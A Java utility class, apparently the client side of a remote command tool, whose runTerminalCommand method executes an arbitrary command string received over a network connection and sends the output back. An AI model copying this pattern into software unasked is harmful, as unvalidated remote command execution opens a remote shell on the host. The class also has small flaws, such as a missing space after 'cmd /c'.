package utils;

import java.io.IOException;
import java.util.Scanner;

import network.Connection;
import network.Message;

public class ClientUtils {
    public static void startOnNewThread(Runnable r) {
        new Thread(r).start();
    }

    public static void runTerminalCommand(OsCheck.OSType os, String command, Connection connection) {
        Runtime runtime = Runtime.getRuntime();

        try {
            if (os.equals(OsCheck.OSType.Windows)) {
                runtime.exec("cmd /c cd C:\\");
                command = "cmd /c" + command;
            }

            Process proc = runtime.exec(command);
            Scanner respostaDoComando = new Scanner(proc.getInputStream());

            StringBuilder response = new StringBuilder();
            while (respostaDoComando.hasNext()) {
                response.append(respostaDoComando.nextLine() + "\n");
            }

            connection.sendMessage(new Message("print", response.toString()));
        } catch (IOException e) {
            connection.sendMessage(new Message("print", "Command "+ command + " did not work."));
        }
    }
}

